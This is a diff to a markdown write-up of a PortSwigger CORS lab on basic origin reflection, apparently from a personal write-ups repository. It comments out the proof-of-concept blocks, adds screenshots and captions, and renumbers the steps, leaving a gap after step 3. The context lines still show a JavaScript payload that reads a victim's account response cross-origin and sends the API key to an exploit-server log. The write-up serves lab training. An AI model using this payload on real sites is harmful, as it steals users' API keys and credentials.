@@ -1,6 +1,6 @@
 # Writeup for PortSwigger CORS Lab: Basic Origin Reflection Attack
 
-## PoC Code That Worked
+<!-- ## PoC Code That Worked
 ```html
 <script>
     var req = new XMLHttpRequest();
@@ -35,7 +35,7 @@
     </script>
 </body>
 </html>
-```
+``` -->
 
 ## Steps Followed to Solve the Lab
 
@@ -54,7 +54,7 @@
 
 3. **Creating and Testing the Exploit**:
    - Navigated to the exploit server and entered the following HTML payload, replacing `YOUR-LAB-ID` with the unique lab ID:
-     ```html
+    <!-- ```html
      <script>
          var req = new XMLHttpRequest();
          req.onload = reqListener;
@@ -66,14 +66,16 @@
              location = '/log?key=' + this.responseText;
          };
      </script>
-     ```
+     ```-->
+   ![Basic Origin Reflection Attack Lab 1](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/cors-lab1c.PNG)
+   
    - Clicked **View exploit** to test the payload.
    - Verified that the exploit worked by landing on the log page, with the API key included in the URL.
 
-4. **Delivering the Exploit**:
+5. **Delivering the Exploit**:
    - Returned to the exploit server and clicked **Deliver exploit to victim**.
 
-5. **Retrieving the Victim's API Key**:
+6. **Retrieving the Victim's API Key**:
    - Clicked **Access log** on the exploit server.
    - Retrieved the victim's API key from the logs and submitted it to complete the lab.
 
@@ -86,8 +88,10 @@ This lab demonstrated how to exploit a CORS origin reflection vulnerability usin
 
 ![Basic Origin Reflection Attack Lab 1](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/cors-lab1a.PNG)
 
+The Admin's API Key is highlighted
+
 ![Basic Origin Reflection Attack Lab 1](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/cors-lab1b.PNG)
 
-![Basic Origin Reflection Attack Lab 1](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/cors-lab1c.PNG)
 
+Initial PoC That Did Not Work from Rana Khalil Tutorials
 ![Basic Origin Reflection Attack Lab 1](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/cors-lab1d.PNG)
